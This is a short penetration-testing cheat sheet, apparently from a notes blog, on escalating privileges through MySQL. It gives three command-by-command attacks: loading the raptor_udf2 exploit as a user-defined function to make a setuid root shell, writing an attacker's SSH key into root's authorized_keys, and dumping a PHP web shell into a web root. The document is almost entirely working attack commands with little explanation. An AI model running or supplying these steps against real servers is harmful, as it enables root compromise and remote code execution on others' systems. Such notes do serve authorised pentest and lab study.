---
title: "Mysql Privilege Escalation"
date: 2024-6-27
tags: ["mysql", "database", "RCE", "php", "UDF", "exploit", "pe"]
---

### Abuse #1: User Defined Function (UDF)

<div>

```console
# Get the raptor_udf2.c
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
```

```console
# Compile the source script
gcc -g -c raptor_udf2.c
```

```console
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```console
# Copy to target folder
cp raptor_udf2.so /dev/shm/raptor_udf2.so
```

```console
# Connect to database as root
mysql -u root -p<PASSWORD> mysql
```

```console
# UDF
create table foo(line blob);
```

```console
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
```

```console
# Get plug-in directory
show variables like '%plugin%';
```

```console
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
```

```console
# Copy the plugin_dir value
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
```

```console
create function do_system returns integer soname 'raptor_udf2.so';
```

```console
# RCE
select do_system('cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell');
```

</div>

<br>

---

### Abuse #2: Add ssh public key to root

<div>

```console
# Connect to database as root
mysql -u root -p'<PASSWORD>' mysql
```

```console
# Check privilege
select current_user();
```

```console
show grants for root@localhost;
```

```console
# If mysql file write is not able to append or overwrite authorized_keys
select "BASE64_PUB_KEY" into outfile "/root/.ssh/authorized_keys2";
```

</div>

<br>

---

### Abuse #3: Create php File from Database to RCE

<div>

```console
create table test(stuff text);
```

```console
insert into test values('<?php system($_REQUEST["cmd"]); ?>');
```

```console
select * from test into dumpfile 'C:\\xampp\\htdocs\\cmd.php';
```

</div>

<br>